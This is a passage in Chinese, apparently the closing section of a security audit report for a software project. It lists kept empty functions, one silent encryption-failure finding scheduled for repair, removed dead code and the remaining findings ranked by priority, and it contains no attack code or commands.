- 前端 44 处空函数均为有意惯用法（noop 默认回调、catch 吞异常、占位 close），删除会破坏行为，予以保留。
- 语义层面的"空实现"：QX-074（encrypt/decrypt 失败静默返回空串）列入后续修复，以错误传播替代。
- 本轮已删除被替代的死代码：`redactSessionInQuery`（功能并入 sanitizeAuditQuery）。

### 待修复（后续轮次）

- High 仅剩：QX-004（主密钥移出 data.db / OS 密钥链 / 口令派生——需独立设计轮）
- P1 其余：QX-021（首信指纹确认）、QX-026（按主机授权）、QX-029（refresh 轮换原子性）、QX-031/032（审计缺口/归属）、QX-033（sudo 回显）、QX-034（WS 超时）、QX-039/040（审计反取证）、QX-044/045/048/049（前端沙箱/渲染/SDK）
- P2：其余 Low/Info 逐项（QX-016 残留等）

---
*报告由 6 个并行专项审计 + 汇总复核生成；原始发现 107 项，去重后 80 项。*
